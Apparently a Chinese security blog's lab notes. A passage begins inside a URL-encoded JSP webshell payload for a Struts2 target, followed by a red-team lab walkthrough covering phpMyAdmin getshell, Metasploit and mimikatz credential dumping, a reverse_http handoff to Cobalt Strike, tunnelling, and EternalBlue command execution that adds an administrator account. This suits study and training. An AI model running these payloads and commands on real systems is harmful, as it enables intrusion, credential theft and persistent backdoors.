class="hljs-variable">%6</span>a<span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%20</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%7</span>a<span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%44</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%76</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%28</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%75</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%75</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%62</span><span class="hljs-variable">%79</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%5</span>d<span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%53</span><span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%76</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>b<span class="hljs-variable">%65</span><span class="hljs-variable">%28</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%53</span><span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%20</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%73</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%50</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%69</span><span class="hljs-variable">%66</span><span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%73</span><span class="hljs-variable">%20</span><span class="hljs-variable">%21</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%75</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%77</span><span class="hljs-variable">%20</span><span class="hljs-variable">%55</span><span class="hljs-variable">%28</span><span class="hljs-variable">%74</span><span class="hljs-variable">%68</span><span class="hljs-variable">%69</span><span class="hljs-variable">%73</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%28</span><span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%44</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%28</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%73</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%77</span><span class="hljs-variable">%49</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%65</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%73</span><span class="hljs-variable">%28</span><span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>e&amp;encoding<span class="hljs-operator">=</span>UTF<span class="hljs-number">-8</span>&amp;pp<span class="hljs-operator">=</span>/hello<br></code></pre></td></tr></table></figure><p>访问hellocmd.jsp</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116171220498.png" alt="image-20240116171220498"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116171256605.png" alt="image-20240116171256605"></p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RedSun01</title>
    <link href="/2024/01/15/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/RedSun01/"/>
    <url>/2024/01/15/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/RedSun01/</url>
    
    <content type="html"><![CDATA[<h1 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h1><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>现在是已经知道ip的前提之下，我们尝试攻击</p><ol><li><p>通过ip直接就扫描端口</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115203934384.png" alt="image-20240115203934384"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115204051039.png" alt="image-20240115204051039"></p><p>出现了一个php探针</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115204150506.png" alt="image-20240115204150506"></p><p>尝试爆破一下</p><p>发现存在弱口令</p><blockquote><p>root </p><p>root</p></blockquote></li><li><p>有服务就就尝试搜索一下子域名</p><p>刚才有一个弱口令，现在如果有一个phpmyadmin就好了</p><p>然后他来了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115213811345.png" alt="image-20240115213811345"></p></li><li><p>目录扫描</p></li><li><p>子域名爆破</p></li></ol><h1 id="跳板机"><a href="#跳板机" class="headerlink" title="跳板机"></a>跳板机</h1><h2 id="通过phpmyadmin-慢日志getshell"><a href="#通过phpmyadmin-慢日志getshell" class="headerlink" title="通过phpmyadmin+慢日志getshell"></a>通过phpmyadmin+慢日志getshell</h2><ol><li><p>由于扫出来了phpmyadmin，所以就直接访问了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115213848670.png" alt="image-20240115213848670"></p><blockquote><p>root</p><p>root</p></blockquote><p><a href="https://blog.csdn.net/m0_47418965/article/details/121708917">最全phpmyadmin漏洞汇总_phpmyadmin弱口令-CSDN博客</a></p><p>参考了一下这个</p><p>尝试使用mysql慢日志的方式下写入shell</p><p>现在就得思考如何才能拿到网站的绝对路径（也就是说操作系统的路径）<br>然后突然想到了探针的那个界面</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115220049070.png" alt="image-20240115220049070"></p><p>发现这个想到了可能会存在测试路径</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115220205777.png" alt="image-20240115220205777"></p><p><a href="https://www.cnblogs.com/endust/p/12132374.html">获取网站路径绝对路径的方法汇总 - 看不尽的尘埃 - 博客园 (cnblogs.com)</a></p><p>话不多说</p><p>去写shell</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115220638737.png" alt="image-20240115220638737"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115220630342.png" alt="image-20240115220630342"></p><p>尝试访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115222107671.png" alt="image-20240115222107671"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115222134229.png" alt="image-20240115222134229"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240115222152209.png" alt="image-20240115222152209"></p></li></ol><h1 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h1><ol><li><p>连接</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93image-20240122164303440.png" alt="image-20240122164303440"></p></li><li><p>提权</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93image-20240122164248591.png" alt="image-20240122164248591"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93image-20240122164243376.png" alt="image-20240122164243376"></p></li><li><p>mimikatz(kiwi)</p><ul><li><p>迁移到64为应用当中</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ps</span><br><span class="hljs-attribute">migrate pid</span><br></code></pre></td></tr></table></figure></li><li><p>加载模块</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">load mimikatz</span><br></code></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">load wiki</span><br><span class="hljs-attribute">creds_all</span><br></code></pre></td></tr></table></figure></li></ul></li></ol><h1 id="将cs和msf联动"><a href="#将cs和msf联动" class="headerlink" title="将cs和msf联动"></a>将cs和msf联动</h1><ol><li><p>创建一个监听器</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/linux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93image-20240122173306206.png" alt="image-20240122173306206"></p></li><li><p>msf</p><p>在有一个session的前提之下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/local/payload_inject <br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http<br><span class="hljs-built_in">set</span> lhost 192.168.79.138 <span class="hljs-comment"># cs地址</span><br><span class="hljs-built_in">set</span> lport  9999 <span class="hljs-comment"># Cs监听器的Port</span><br>exploit/run<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240122202621837.png" alt="image-20240122202621837"></p><p>成功联动</p></li></ol><h1 id="使用msf搭建隧道"><a href="#使用msf搭建隧道" class="headerlink" title="使用msf搭建隧道"></a>使用msf搭建隧道</h1><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">use use auxiliary/server/socks4a<br><span class="hljs-keyword">set</span> VERSION <span class="hljs-comment">4a</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">session 3</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SRVPORT 1080</span><br>exploit<br>back<br></code></pre></td></tr></table></figure><h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p>上传paylaod，使用msf连接</p><ol><li><p>查看内网网段</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use post/windows/gather/arp_scanner<br><span class="hljs-built_in">set</span> RHOSTS 192.168.52.0/24<br><span class="hljs-built_in">set</span> session 3<br>exploit<br>back<br></code></pre></td></tr></table></figure></li><li><p>收集存活主机</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use post/windows/gather/arp_scanner<br><span class="hljs-built_in">set</span> RHOSTS 192.168.52.0/24<br><span class="hljs-built_in">set</span> session 3<br>exploit<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116213149341.png" alt="image-20240116213149341"></p></li><li><p>获取每一主机的端口信息</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240122221119098.png" alt="image-20240122221119098"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116213415088.png" alt="image-20240116213415088"></p><p>还有一个主机就不扫了</p></li><li><p>接着对跳板机做信息收集</p><ul><li><p>操作系统版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo /fo  list  <br></code></pre></td></tr></table></figure></li><li><p>获取密码</p><p>在这里发现发现x86的payload跑不了x64程序，所以尝试使用进程迁移的方式转移到其他进程</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nsis">getuid<br>get<span class="hljs-params">system</span><br>ps <span class="hljs-comment"># 查找可以用于迁移的进程</span><br>migrate pid<br>kiwi_cmd <span class="hljs-title function_">sekurlsa::logonpasswords</span> <br>rev2self<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116220321187.png" alt="image-20240116220321187"></p></li><li><p>查看是否存在域环境</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">     <br></code></pre></td></tr></table></figure></li></ul></li></ol><h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><h2 id="win-server-2003"><a href="#win-server-2003" class="headerlink" title="win server 2003"></a>win server 2003</h2><ol><li><p>发现192.168.52.141 存在445端口，可能存在永恒之蓝漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240122220006925.png" alt="image-20240122220006925"></p><p>一个一个的试试、</p><p>发现第3个能执行，这个是一个执行命令的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240122235340204.png" alt="image-20240122235340204"></p><p>创建一个用户，并加入到管理组中</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> COMMAND net<span class="hljs-built_in"> user </span>hack hack /<span class="hljs-built_in">add</span><br>exploit<br><span class="hljs-built_in">set</span> COMMAND net<span class="hljs-built_in"> user </span>hack passwd /<span class="hljs-built_in">add</span><br>exploit<br><br>net localgroup administrators hack /<span class="hljs-built_in">add</span><br>exploit<br></code></pre></td></tr></table></figure></li><li><p>尝试打开远程桌面</p><p>3389</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic RDTOGGLE <span class="hljs-keyword">WHERE</span> ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> <span class="hljs-keyword">call</span> SetAllowTSConnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>or </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></code></pre></td></tr></table></figure><p>发现并不行</p><p>一直没有上线</p></li><li><p>talent</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">set</span> COMMAND sc config tlntsvr <span class="hljs-built_in">start</span>= auto<br><span class="hljs-built_in">set</span> COMMAND <span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> telnet<br></code></pre></td></tr></table></figure><p>查看23号端口是否存在</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">set</span> <span class="hljs-keyword">COMMAND</span> netstat -an<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240123003121679.png" alt="image-20240123003121679"></p><p>使用talent</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gams">use auxiliary/scanner/telnet/telnet_login<br><br><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.52.141</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-comment">username hack</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-comment">PASSWORD qaz@123</span><br><br>exploit<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240123003345012.png" alt="image-20240123003345012"></p><p>密码不对禁止登录</p><p>得到了新的shell</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240123003453747.png" alt="image-20240123003453747"></p><p>但是这个session有问题，并不能获取返回的结果</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240123004258151.png" alt="image-20240123004258151"></p><p>在外面使用</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240123004424632.png" alt="image-20240123004424632"></p><p>ctrl+] 再输入q退出telnet</p><p>现在基本上拿到了，接下来试试win server 2012</p></li></ol><h2 id="win-server-2012"><a href="#win-server-2012" class="headerlink" title="win server 2012"></a>win server 2012</h2><ol><li><p>目录扫描</p><p>发现开启了端口80，那就扫描一下目录</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123180135784.png" alt="image-20240123180135784"></p><p>并没有什么目录</p></li><li><p>发现存在443</p><p>尝试利用一下</p><p>添加一个用户</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> COMMAND net<span class="hljs-built_in"> user </span>hack qaz@123 /<span class="hljs-built_in">add</span><br><span class="hljs-built_in">set</span> COMMAND net localgroup administrators hack /add<br></code></pre></td></tr></table></figure><p>开启telnet服务</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">set</span> COMMAND sc config tlntsvr <span class="hljs-built_in">start</span>= auto<br><span class="hljs-built_in">set</span> COMMAND <span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> telnet<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/total/image-20240123182027066.png" alt="image-20240123182027066"></p></li><li><p>尝试利用135漏洞</p><blockquote><p>135\137\138\139\445   